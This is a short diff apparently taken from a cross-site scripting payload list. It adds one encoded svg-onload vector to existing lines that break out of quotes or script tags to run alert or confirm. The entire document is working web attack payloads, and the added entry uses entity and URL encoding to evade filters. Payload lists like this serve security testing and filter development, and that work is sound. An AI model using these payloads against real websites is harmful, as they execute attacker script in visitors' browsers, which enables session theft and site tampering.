@@ -8,3 +8,4 @@ a=8,b=confirm,c=window,c.onerror=b;throw-a
 '-alert(6)//
 \'-alert(6)//
 </script><svg onload=alert(6)>
+<svg+onload=alert%26%230000000040"")>&#=%26%230000000040=(
